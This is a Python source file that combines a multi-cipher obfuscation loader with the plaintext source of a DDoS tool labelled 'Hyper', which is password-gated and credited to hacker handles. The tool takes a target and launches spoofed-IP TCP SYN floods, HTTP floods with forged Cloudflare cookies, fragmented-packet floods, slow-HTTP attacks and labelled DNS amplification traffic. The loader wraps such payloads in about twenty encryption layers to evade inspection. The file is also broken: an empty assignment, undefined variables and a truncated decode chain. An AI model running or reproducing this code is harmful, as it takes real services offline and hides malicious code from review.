import os
import sys
import base64
import hashlib
import zlib
import bz2
import re
import gzip
import random
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.decrepit.ciphers.algorithms import ARC4, TripleDES, Blowfish, CAST5, IDEA, SEED

LOGO = '\x1b[1;31m\n███████╗███╗░░██╗░█████╗░░█████╗░██████╗░███████╗██████╗░\n██╔════╝████╗░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗\n█████╗░░██╔██╗██║██║░░╚═╝██║░░██║██║░░██║█████╗░░██████╔╝\n██╔══╝░░██║╚████║██║░░██╗██║░░██║██║░░██║██╔══╝░░██╔══██╗\n███████╗██║░╚███║╚█████╔╝╚█████╔╝██████╔╝███████╗██║░░██║\n╚══════╝╚═╝░░╚══╝░╚════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝\n\n\x1b[1;37mCODE ENC v\x1b[1;32m3\x1b[1;37m.\x1b[1;32m1 \x1b[1;31m| \x1b[1;37mAUTHOR : \x1b[1;32m@ʙʟᴀᴄᴋʜᴀᴛ_ʀᴏᴏᴛ\x1b[1;00m\n'

def pkcs7_unpad(data):
    if not data:
        return data
    pad_len = data[-1]
    if pad_len == 0 or pad_len > len(data):
        raise ValueError("Invalid PKCS7 padding")
    if not all(b == pad_len for b in data[-pad_len:]):
        raise ValueError("Invalid PKCS7 padding")
    return data[:-pad_len]

def xor_data(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_decrypt(data, key):
    try:
        salt = data[:16]
        iv = data[16:28]
        tag = data[28:44]
        ct = data[44:]
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA512(),
            length=32,
            salt=salt,
            iterations=500000,
            backend=default_backend()
        )
        kdf_key = kdf.derive(key)
        cipher = Cipher(algorithms.AES(kdf_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pt
    except Exception as e:
        raise RuntimeError(f"AES decryption failed: {str(e)}")

def arc4_decrypt(data, key):
    try:
        cipher = Cipher(ARC4(key), mode=None, backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(data) + decryptor.finalize()
    except Exception as e:
        raise RuntimeError(f"ARC4 decryption failed: {str(e)}")

def tripledes_decrypt(data, key):
    try:
        iv = data[:8]
        ct = data[8:]
        cipher = Cipher(TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pkcs7_unpad(pt)
    except Exception as e:
        raise RuntimeError(f"TripleDES decryption failed: {str(e)}")

def blowfish_decrypt(data, key):
    try:
        iv = data[:8]
        ct = data[8:]
        cipher = Cipher(Blowfish(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pkcs7_unpad(pt)
    except Exception as e:
        raise RuntimeError(f"Blowfish decryption failed: {str(e)}")

def cast5_decrypt(data, key):
    try:
        iv = data[:8]
        ct = data[8:]
        cipher = Cipher(CAST5(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pkcs7_unpad(pt)
    except Exception as e:
        raise RuntimeError(f"CAST5 decryption failed: {str(e)}")

def idea_decrypt(data, key):
    try:
        iv = data[:8]
        ct = data[8:]
        cipher = Cipher(IDEA(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pkcs7_unpad(pt)
    except Exception as e:
        raise RuntimeError(f"IDEA decryption failed: {str(e)}")

def camellia_decrypt(data, key):
    try:
        iv = data[:16]
        ct = data[16:]
        cipher = Cipher(algorithms.Camellia(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pkcs7_unpad(pt)
    except Exception as e:
        raise RuntimeError(f"Camellia decryption failed: {str(e)}")

def seed_decrypt(data, key):
    try:
        iv = data[:16]
        ct = data[16:]
        cipher = Cipher(SEED(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pkcs7_unpad(pt)
    except Exception as e:
        raise RuntimeError(f"SEED decryption failed: {str(e)}")

def reverse_bytes(data):
    return data[::-1]

def custom_sbox_unsub(data, inv_sbox):
    return bytes([inv_sbox[b] for b in data])

def block_unshuffle(data, seed):
    try:
        orig_len_str = data[-36:-20].decode('ascii')
        num_blocks_str = data[-20:-10].decode('ascii')
        block_size_str = data[-10:].decode('ascii')
        orig_len = int(orig_len_str)
        num_blocks = int(num_blocks_str)
        block_size = int(block_size_str)
        data = data[:-36]
        if len(data) != num_blocks * block_size:
            raise ValueError("Invalid shuffled data length")
        blocks = [data[i:i+block_size] for i in range(0, len(data), block_size)]
        random.seed(seed)
        indices = list(range(num_blocks))
        shuffled_indices = indices[:]
        random.shuffle(shuffled_indices)
        unshuffled = [None] * num_blocks
        for pos, orig_idx in enumerate(shuffled_indices):
            unshuffled[orig_idx] = blocks[pos]
        unpadded = b''.join(unshuffled)[:orig_len]
        return unpadded
    except Exception as e:
        raise RuntimeError(f"Block unshuffle failed: {str(e)}")

def pattern_bit_flip(data, pattern):
    pattern_repeated = pattern * (len(data) // len(pattern) + 1)
    return xor_data(data, pattern_repeated[:len(data)])

def bit_rotate_right(data, shifts):
    return bytes([(b >> shifts) | (b << (8 - shifts)) % 256 for b in data])

def multi_base64_deobfuscate(data):
    try:
        dec = base64.b16decode(data)
        dec = base64.b32decode(dec)
        dec = base64.b64decode(dec, validate=True)
        dec = base64.b85decode(dec)
        dec = dec[::-1]
        dec = base64.b64decode(dec, validate=True)
        return dec
    except Exception as e:
        raise RuntimeError(f"Multi-base64 deobfuscation failed: {str(e)}")

def fernet_decrypt(data, key):
    try:
        from cryptography.fernet import Fernet
        f = Fernet(base64.urlsafe_b64encode(key))
        return f.decrypt(data)
    except Exception as e:
        raise RuntimeError(f"Fernet decryption failed: {str(e)}")

def rsa_decrypt(data, private_key):
    try:
        if len(data) >= 12 and data[-12:-4] == b'CHUNKED:':
            num_chunks_str = data[-4:].decode('ascii')
            num_chunks = int(num_chunks_str)
            data = data[:-12]
            chunk_size = len(data) // num_chunks
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            decrypted_chunks = []
            for chunk in chunks:
                decrypted_chunks.append(private_key.decrypt(
                    chunk,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA512()),
                        algorithm=hashes.SHA512(),
                        label=None
                    )
                ))
            return b''.join(decrypted_chunks)
        else:
            return private_key.decrypt(
                data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA512()),
                    algorithm=hashes.SHA512(),
                    label=None
                )
            )
    except Exception as e:
        raise RuntimeError(f"RSA decryption failed: {str(e)}")

def deobfuscate_private_key(obfuscated):
    try:
        decoded = base64.b16decode(obfuscated.encode('utf-8'))
        decoded = base64.b32decode(decoded)
        decoded = base64.b64decode(decoded, validate=True)
        decoded = base64.b85decode(decoded)
        decoded = decoded[::-1]
        decoded = base64.b64decode(decoded, validate=True)
        xor_key3 = decoded[-64:]
        xor_key2 = decoded[-128:-64]
        xor_key1 = decoded[-192:-128]
        xored = decoded[:-192]
        pem = xor_data(xored, xor_key3)
        pem = xor_data(pem, xor_key2)
        pem = xor_data(pem, xor_key1)
        return serialization.load_pem_private_key(pem, password=None, backend=default_backend())
    except Exception as e:
        raise RuntimeError(f"Private key deobfuscation failed: {str(e)}")

obfuscated_source=
try:
    from os import system
    import requests,socket,dns.resolver,scapy
except ModuleNotFoundError:
    system("pip3 install requests rich pysocket dnspython scapy")

import socket
import struct
import random
import threading
import time
import sys
import os
import ssl
import ipaddress
import requests
import dns.resolver
import json
import urllib3
from rich.console import Console as color
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
from scapy.layers.http import HTTPRequest
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

p = '[bold white]'
h = '[bold green]'
m = '[bold red]'
y = '[bold yellow]'
P = '\x1b[1;37m'
H = '\x1b[1;32m'
R = '\x1b[0m'

class SerpentConfig:
    def __init__(self):
        self.passwd()
        color.print(f"""{m}
██╗░░██╗██╗░░░██╗██████╗░███████╗██████╗░
██║░░██║╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
███████║░╚████╔╝░██████╔╝█████╗░░██████╔╝
██╔══██║░░╚██╔╝░░██╔═══╝░██╔══╝░░██╔══██╗
██║░░██║░░░██║░░░██║░░░░░███████╗██║░░██║
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
{p}«=========================================»
{p}AUTHOR   » {h}⫷ 🅂🄷🄰🄳🄾🅆 ⫸
{p}TELEGRAM » @Lazarus_404
{h}VERSION  » {h}1.0 
{p}USER IP  » {h}{self.ip}
        """)
        
        self.target = color.input(f"{p}[{y}?{p}] Target ({h}IP{p}/{h}Domain{p}): ").strip()
        self.target_ip = self.resolve_target(self.target)
        self.port = int(color.input(f"{p}[{y}?{p}] Port (default {h}443{h}): ") or 443)
        self.duration = int(color.input(f"{p}[{y}?{p}] Duration seconds ({h}0=∞{h}): ") or 0)
        self.threads = int(color.input(f"{p}[{y}?{p}] Threads ({h}recommend 1000{p}): ") or 2000)
        self.service = self.detect_service()
        self.cidr_ranges = [
            "1.0.0.0/24",
            "8.8.8.0/24",
            "104.16.0.0/12",
            "172.217.0.0/16",
            "52.216.0.0/15",
            "13.107.0.0/16",
            "151.101.0.0/16",
            "185.60.216.0/22",
        ]
        
        self.user_agents = self.load_user_agents()
        self.protocols = {
            'http': self.setup_http_attack(),
            'https': self.setup_https_attack(),
            'dns': self.setup_dns_attack(),
            'tcp': self.setup_tcp_attack(),
            'udp': self.setup_udp_attack()
        }
    
    def logo_login(self):
          color.print(f'''{m}
             ██▓        ▒█████       ▄████     ██▓    ███▄    █ 
            ▓██▒       ▒██▒  ██▒    ██▒ ▀█▒   ▓██▒    ██ ▀█   █ 
            ▒██░       ▒██░  ██▒   ▒██░▄▄▄░   ▒██▒   ▓██  ▀█ ██▒
            ▒██░       ▒██   ██░   ░▓█  ██▓   ░██░   ▓██▒  ▐▌██▒
            ░██████▒   ░ ████▓▒░   ░▒▓███▀▒   ░██░   ▒██░   ▓██░
            ░ ▒░▓  ░   ░ ▒░▒░▒░     ░▒   ▒    ░▓     ░ ▒░   ▒ ▒ 
            ░ ░ ▒  ░     ░ ▒ ▒░      ░   ░     ▒ ░   ░ ░░   ░ ▒░
              ░ ░      ░ ░ ░ ▒     ░ ░   ░     ▒ ░      ░   ░ ░ 
             ░  ░       ░ ░           ░     ░              ░ 
          ''')
    
    def clear(self):
        if "linux" in sys.platform.lower():
          os.system('clear')
        elif "win" in sys.platform.lower():
          os.system('cls')

    def passwd(self):
        passwd_valid = "key_#gskgd8sys88su8e9e73938383izh"
        while True:
            self.clear()
            self.logo_login()
            color.print(f"{h}                    INPUT PASSWORD UNTUK RUN SCRIPT INI!\n")
            try:
                passwd = color.input(f"{p}INPUT PASSWORD : {h}")
            except (KeyboardInterrupt, EOFError):
                color.print(f"\n{m}Exiting...")
                sys.exit(1)
            if passwd == passwd_valid:
                color.print(f"{h}password valid sedang run script! ✓")
                time.sleep(1)
                break
            else:
                color.print(f"{m}password invalid atau kosong! ×")
                time.sleep(1)

    def ip (self):
        try:
            return requests.get("https://api.ipify.org").text
        except Exception:
            return f"{m}N/A"

    def resolve_target(self, target):
        try:
            return socket.gethostbyname(target)
        except Exception:
            resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
            for resolver in resolvers:
                try:
                    answer = dns.resolver.resolve(target, 'A')
                    return str(answer[0])
                except Exception:
                    continue
            print("[!] Failed to resolve target")
            sys.exit(1)
    
    def detect_service(self):
        common_ports = {
            80: 'http',
            443: 'https',
            53: 'dns',
            22: 'ssh',
            25: 'smtp',
            3306: 'mysql'
        }
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target_ip, self.port))
            if result == 0:
                return common_ports.get(self.port, 'tcp')
        except Exception:
            pass
        return 'tcp'
    
    def load_user_agents(self):
        ua_list = []
        try:
            ua_list = [
                "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2",
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.1 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.0 Safari/532.2",
                "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
                "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.7 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.3 Safari/532.2",
                "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.0 Safari/532.2",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.220.1 Safari/532.1",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.5 Safari/532.1",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.5 Safari/532.1",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.4 Safari/532.1",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1",
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
            ]
        except Exception:
            ua_list = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
        return ua_list

class IPSpoofEngine:
    @staticmethod
    def generate_spoofed_packet(target_ip, target_port, protocol='tcp'):
        cidr = random.choice(config.cidr_ranges)
        network = ipaddress.ip_network(cidr, strict=False)
        random_ip = str(network[random.randint(0, network.num_addresses - 1)])
        src_port = random.randint(1024, 65535)
        if protocol == 'tcp':
            ip_layer = IP(src=random_ip, dst=target_ip, ttl=random.randint(32, 255))
            tcp_layer = TCP(
                sport=src_port,
                dport=target_port,
                flags=random.choice(['S', 'A', 'PA', 'FA']),  # SYN, ACK, PUSH-ACK, FIN-ACK
                seq=random.randint(0, 2**32-1),
                window=random.randint(512, 65535)
            )
            payload = random._urandom(random.randint(64, 1460))
            return ip_layer/tcp_layer/payload
        
        elif protocol == 'udp':
            ip_layer = IP(src=random_ip, dst=target_ip, ttl=64)
            udp_layer = UDP(sport=src_port, dport=target_port)
            payload = random._urandom(random.randint(512, 1024))
            return ip_layer/udp_layer/payload

        elif protocol == 'icmp':
            ip_layer = IP(src=random_ip, dst=target_ip)
            icmp_layer = ICMP(type=8, code=0)  # Echo request
            payload = random._urandom(random.randint(32, 1024))
            return ip_layer/icmp_layer/payload

class CloudflareBypass:
    @staticmethod
    def bypass_cf_challenge(target_url):
        headers = {
            'User-Agent': random.choice(config.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'TE': 'trailers'
        }
        
        cookies = {
            '__cf_bm': ''.join(random.choices('abcdef0123456789', k=100)),
            '__cfduid': ''.join(random.choices('abcdef0123456789', k=43)),
            'cf_clearance': ''.join(random.choices('abcdef0123456789', k=60))
        }
        
        return headers, cookies
    
    @staticmethod
    def generate_legit_traffic(target_ip, target_port):
        paths = [
            '/', '/index.html', '/home', '/api/health', '/robots.txt',
            '/sitemap.xml', '/wp-json/', '/graphql', '/api/v1/ping',
            '/static/css/main.css', '/static/js/app.js'
        ]

        request_template = (
            "GET {} HTTP/1.1\r\n"
            "Host: {}\r\n"
            "User-Agent: {}\r\n"
            "Accept: {}\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Connection: keep-alive\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "\r\n"
        )
        
        return request_template.format(
            random.choice(paths),
            target_ip,
            random.choice(config.user_agents),
            random.choice(['text/html', 'application/json', '*/*'])
        )

class WAFBypassEngine:
    @staticmethod
    def obfuscate_payload(payload):
        obfuscated = ''.join(
            random.choice([c.upper(), c.lower()]) if random.random() > 0.5 else c 
            for c in payload
        )
        
        if random.random() > 0.7:
            obfuscated = obfuscated.replace(' ', '  ').replace('=', ' = ')
        
        if random.random() > 0.8:
            chars_to_encode = random.sample(list(obfuscated), max(1, len(obfuscated)//10))
            for char in chars_to_encode:
                obfuscated = obfuscated.replace(char, f'%{ord(char):02X}')
        
        if random.random() > 0.9:
            obfuscated = obfuscated.replace('&', '%00&')
        
        return obfuscated
    
    @staticmethod
    def fragment_packets():
        ip = IP(dst=config.target_ip, flags=1, frag=0)  # More fragments flag
        payload = random._urandom(1500)  # Larger than MTU
        fragments = fragment(ip/payload, fragsize=500)
        return fragments

class ProtocolFloodEngine:
    @staticmethod
    def http_flood():
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.1)
        adapter = HTTPAdapter(max_retries=retry, pool_connections=200, pool_maxsize=200)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while attack_active:
            try:
                headers, cookies = CloudflareBypass.bypass_cf_challenge(f"http://{config.target}")
                methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']
                method = random.choice(methods)
                params = {f'param{i}': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) 
                         for i in range(random.randint(1, 5))}
                json_data = {'data': ''.join(random.choices('0123456789', k=50))} if method in ['POST', 'PUT'] else None
                if method == 'GET':
                    session.get(f"http://{config.target}:{config.port}", 
                               headers=headers, cookies=cookies, params=params, timeout=2)
                elif method == 'POST':
                    session.post(f"http://{config.target}:{config.port}", 
                                headers=headers, cookies=cookies, json=json_data, timeout=2)
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception:
                continue
    
    @staticmethod
    def tcp_syn_flood():
        while attack_active:
            try:
                packet = IPSpoofEngine.generate_spoofed_packet(
                    config.target_ip, config.target_port, 'tcp'
                )
                send(packet, verbose=0)
                time.sleep(random.uniform(0.001, 0.01))
            except Exception:
                continue
    
    @staticmethod  
    def udp_amplification():
        dns_query = bytes.fromhex(
            "AA AA 01 00 00 01 00 00 00 00 00 00 07 65 78 61 "
            "6D 70 6C 65 03 63 6F 6D 00 00 01 00 01"
        )
      
        dns_servers = ['208.67.222.222', '208.67.220.220', '8.8.8.8', '1.1.1.1']
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.5)
                server = random.choice(dns_servers)
                sock.sendto(dns_query, (server, 53))
                sock.close()
                time.sleep(0.001)
            except Exception:
                continue

class SerpentAttackController:
    def __init__(self):
        self.attack_threads = []
        self.attack_active = True
        global attack_active
        attack_active = True
        
    def start_multi_vector_attack(self):
    
        color.print(f"\n{p}[{h}+{p}] Starting {h}Dos 4-Layer {p}Attack...")
        color.print(f"{p}[{h}+{p}] Target: {h}{config.target_ip}:{config.port}")
        color.print(f"{p}[{h}+{p}] Protocol: {h}{config.service}")
        color.print(f"{p}[{h}+{p}] Threads: {h}{config.threads}")
        color.print(f"\n{p}[{m}!{p}] Attack initiated at:{h}", time.strftime("%Y-%m-%d %H:%M:%S"))
        threads_per_skill = config.threads // 4
      
        for i in range(threads_per_skill):
            t = threading.Thread(target=self.ip_spoofing_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
      
        for i in range(threads_per_skill):
            t = threading.Thread(target=self.cf_bypass_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        for i in range(threads_per_skill):
            t = threading.Thread(target=self.waf_evasion_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        for i in range(threads_per_skill):
            t = threading.Thread(target=self.protocol_flood_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
    
        self.monitor_attack()
    
    def ip_spoofing_worker(self):
        while self.attack_active:
            ProtocolFloodEngine.tcp_syn_flood()
    
    def cf_bypass_worker(self):
        while self.attack_active:
            ProtocolFloodEngine.http_flood()
    
    def waf_evasion_worker(self):
        while self.attack_active:
            fragments = WAFBypassEngine.fragment_packets()
            for frag in fragments:
                send(frag, verbose=0)
            time.sleep(0.01)
    
    def protocol_flood_worker(self):
        while self.attack_active:
            attack_type = random.choice(['udp_amp', 'http_slow', 'tcp_mix'])
            if attack_type == 'udp_amp':
                ProtocolFloodEngine.udp_amplification()
            elif attack_type == 'http_slow':
                self.slow_http_attack()
            else:
                self.mixed_tcp_attack()
    
    def slow_http_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((config.target_ip, config.port))
            headers = CloudflareBypass.generate_legit_traffic(config.target_ip, config.port)
            sock.send(headers.encode()[:100])  # Hanya kirim sebagian
          
            for i in range(100, len(headers), 10):
                if not self.attack_active:
                    break
                sock.send(headers.encode()[i:i+10])
                time.sleep(random.uniform(5, 10))  # Delay lama
            sock.close()
        except Exception:
            pass
    
    def mixed_tcp_attack(self):
        flags_combinations = ['S', 'A', 'PA', 'FA', 'RA', 'SRA']
        while self.attack_active:
            try:
                ip = IP(src=RandIP(), dst=config.target_ip)
                tcp = TCP(sport=RandShort(), dport=config.port, 
                         flags=random.choice(flags_combinations),
                         seq=RandInt(), ack=RandInt())
                send(ip/tcp, verbose=0)
                time.sleep(0.001)
            except Exception:
                continue
    
    def monitor_attack(self):
        start_time = time.time()
        
        try:
            if config.duration > 0:
                color.print(f"{p}[{h}+{p}] Attack will run for {h}{config.duration} seconds")
                while time.time() - start_time < config.duration:
                    elapsed = int(time.time() - start_time)
                    sys.stdout.write(f"\r{P}[{H}+{P}] Elapsed: {H}{elapsed}{P}s | Active threads: {H}{threading.active_count()}{R}")
                    sys.stdout.flush()
                    time.sleep(1)
                self.stop_attack()
                color.print(f"\n{p}[{h}+{p}] Attack completed after {h}{config.duration} seconds")
            else:
                color.print(f"{p}[{h}+{p}] Attack running indefinitely. Press {h}Ctrl+C {p}to stop.")
                while True:
                    elapsed = int(time.time() - start_time)
                    sys.stdout.write(f"\r{P}[{H}+{P}] Elapsed: {H}{elapsed}{P}s | Active threads: {H}{threading.active_count()}{R}")
                    sys.stdout.flush()
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            self.stop_attack()
            color.print(f"\n{p}[{h}!{p}] {m}Attack stopped by user")
    
    def stop_attack(self):
        global attack_active
        self.attack_active = False
        attack_active = False
        color.print(f"\n{p}[{m}!{p}] {m}Stopping all attack threads...")
        time.sleep(2)

if __name__ == "__main__":
    
    confirm = color.input(f"{p}[{y}?{p}] [{h}ATTACK CONFIRMATION{p}]=[{h}WANT TO CONTINUE?{p}] ({h}yes{p}/{m}no{p}): ")
    if confirm.lower() != 'yes':
        color.print(f"{p}[{m}!{p}] {m}Exiting...")
        sys.exit(0)
    
    if os.geteuid() != 0:
        color.print(f"{p}[{m}!{p}] {y}Warning: {m}Running without root privileges. Some features may not work.")
        color.print(f"{p}[{m}!{p}] Consider running with: {h}sudo python3 run.py")
    
    config = SerpentConfig()
    attack_active = True
    controller = SerpentAttackController()
    controller.start_multi_vector_attack()
try:
    private_key = deobfuscate_private_key(obfuscated_private)
    
    xor_key = rsa_decrypt(base64.b64decode(enc_xor), private_key)
    aes_key = rsa_decrypt(base64.b64decode(enc_aes), private_key)
    arc4_key = rsa_decrypt(base64.b64decode(enc_arc4), private_key)
    fernet_key = rsa_decrypt(base64.b64decode(enc_fernet), private_key)
    shifts = int(rsa_decrypt(base64.b64decode(enc_shifts), private_key).decode())
    tripledes_key = rsa_decrypt(base64.b64decode(enc_tripledes), private_key)
    blowfish_key = rsa_decrypt(base64.b64decode(enc_blowfish), private_key)
    cast5_key = rsa_decrypt(base64.b64decode(enc_cast5), private_key)
    idea_key = rsa_decrypt(base64.b64decode(enc_idea), private_key)
    sbox_bytes = rsa_decrypt(base64.b64decode(enc_sbox), private_key)
    sbox = list(sbox_bytes)
    shuffle_seed = int(rsa_decrypt(base64.b64decode(enc_shuffle_seed), private_key).decode())
    pattern = rsa_decrypt(base64.b64decode(enc_pattern), private_key)
    camellia_key = rsa_decrypt(base64.b64decode(enc_camellia), private_key)
    seed_key = rsa_decrypt(base64.b64decode(enc_seed), private_key)
    
    payload = base64.b64decode(enc_payload)
    
    current_hash = hashlib.sha512(payload).hexdigest()
    blake_hash = hashes.Hash(hashes.BLAKE2b(64), backend=default_backend())
    blake_hash.update(payload)
    sha3_hash = hashes.Hash(hashes.SHA3_512(), backend=default_backend())
    sha3_hash.update(payload)
    current_integrity = current_hash + blake_hash.finalize().hex() + sha3_hash.finalize().hex()
    if current_integrity != integrity_expected:
        print("Integrity check failed! Exiting.")
        sys.exit(1)
    
    payload = gzip.decompress(payload)  # 19
    payload = reverse_bytes(payload)  # 18
    payload = seed_decrypt(payload, seed_key)  # 17
    payload = camellia_decrypt(payload, camellia_key)  # 16
    payload = pattern_bit_flip(payload, pattern)  # 15
    payload = bz2.decompress(payload)  # 14
    payload = block_unshuffle(payload, shuffle_seed)  # 13
    inv_sbox = [0] * 256
    for i, v in enumerate(sbox):
        inv_sbox[v] = i
    payload = custom_sbox_unsub(payload, inv_sbox)  # 12
    payload = idea_decrypt(payload, idea_key)  # 11
    payload = cast5_decrypt(payload, cast5_key)  # 10
    payload = blowfish_decrypt(payload, blowfish_key)  # 9
    payload = tripledes_decrypt(payload, tripledes_key)  # 8
    payload = fernet_decrypt(payload, fernet_key)  # 7
    payload = bit_rotate_right(payload, shifts)  # 6
    payload = arc4_decrypt(payload, arc4_key)  # 5
    payload = multi_base64_deobfuscate(payload)  # 4
    payload = zlib.decompress(payload)  # 3
    payload = aes_decrypt(payload, aes_key)  # 2
